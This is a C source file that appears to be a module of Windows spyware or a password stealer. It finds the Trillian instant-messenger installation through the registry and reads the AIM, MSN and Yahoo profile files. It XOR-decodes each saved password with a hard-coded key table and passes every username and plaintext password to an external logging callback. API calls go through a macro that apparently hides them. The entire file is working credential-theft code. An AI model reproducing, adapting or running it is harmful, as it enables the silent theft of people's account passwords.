
#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "..\common.h"

#include <windows.h>

// callback for the password
extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);

#define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);

struct p_entry {
	WCHAR service[64];
	WCHAR resource[255];
	WCHAR user_name[255];
	WCHAR user_value[255];
	WCHAR pass_name[255];
	WCHAR pass_value[255];
};

extern int DirectoryExists(WCHAR *path);

int decode_pass_trillian(char *pass, char *decoded)
{
	unsigned char enc_table[] = {0xF3, 0x26, 0x81, 0xC4, 0x39, 0x86, 0xDB, 0x92, 0x71, 0xA3, 0xB9, 0xE6, 0x53, 0x7A, 0x95, 0x7C};

	for (unsigned int i = 0; i < strlen(pass); i += 2) {
		char current[3];
		memcpy(current, pass + i, 3);
		current[2] = 0;
		int j;
		j = strtol(current, NULL, 16);
		j &= 0xff;
		decoded[i/2] = enc_table[i/2] ^ (char)j;
	}

	return 0;
}

WCHAR *GetTRPath()
{
	static WCHAR FullPath[MAX_PATH];
	char regSubKey[]    = "SOFTWARE\\Clients\\IM\\Trillian\\DefaultIcon";
	char path[MAX_PATH];
	char *p;
	DWORD pathSize = MAX_PATH;
	DWORD valueType;
	HKEY rkey;

	if( FNC(RegOpenKeyExA)(HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
		return NULL;

	if( FNC(RegQueryValueExA)(rkey, NULL, 0,  &valueType, (unsigned char*)&path, &pathSize) != ERROR_SUCCESS ) {
		FNC(RegCloseKey)(rkey);
		return NULL;
	}

	if( pathSize <= 0 || path[0] == 0) {
		FNC(RegCloseKey)(rkey);
		return NULL;
	}

	FNC(RegCloseKey)(rkey);

	// get the path and then remove the initial \"
	if ((p = strrchr(path, '\\')) != NULL)
		*p = '\0';

	p = path;

	if( *p == '\"' ) 
		p++;

	if (!p)
		return NULL;

	_snwprintf_s(FullPath, MAX_PATH, L"%S\\users\\default", p);		

	return FullPath;
}


int DumpTR(WCHAR *trillPath, WCHAR *signonFile)
{
	WCHAR iniFile[MAX_PATH];
	WCHAR name[64];
	WCHAR wPass[64];
	CHAR pass[64];
	CHAR dec_pass[64];
	struct p_entry trentry;
	WCHAR profile[16];
	WCHAR *p;
	UINT i = 0;

	memset(&trentry, 0, sizeof(trentry));

	swprintf_s(trentry.service, 255, L"Trillian");
	_snwprintf_s(trentry.resource, 255, _TRUNCATE, L"%s", signonFile);
	
	if ((p = wcsrchr(trentry.resource, '.')) != NULL)
		*p = '\0';

	_snwprintf_s(iniFile, MAX_PATH, L"%s\\%s", trillPath, signonFile);

	for (;;) {
		memset(&dec_pass, 0, sizeof(dec_pass));

		swprintf_s(profile, 16, L"profile %d", i++);

		FNC(GetPrivateProfileStringW)(profile, L"name", L"", name, sizeof(name), iniFile);
		FNC(GetPrivateProfileStringW)(profile, L"password", L"", wPass, sizeof(wPass), iniFile);
		
		if (!wcscmp(name, L"") || !wcscmp(wPass, L""))
			break;

		sprintf_s(pass, sizeof(pass), "%S", wPass);
		decode_pass_trillian(pass, dec_pass);
		
		_snwprintf_s(trentry.user_value, 255, _TRUNCATE, L"%s", name);
		_snwprintf_s(trentry.pass_value, 255, _TRUNCATE, L"%S", dec_pass);

		LogPassword(trentry.service, trentry.resource, trentry.user_value, trentry.pass_value);
	} 
	
	return i;
}


int DumpTrillian(void)
{
	WCHAR *TRDir = NULL;   		//Trillian main installation path

	TRDir = GetTRPath();

	if (TRDir && !DirectoryExists(TRDir)) 
		return 0;

	DumpTR(TRDir, L"aim.ini");
	DumpTR(TRDir, L"msn.ini");
	DumpTR(TRDir, L"yahoo.ini");

	return 0;
}
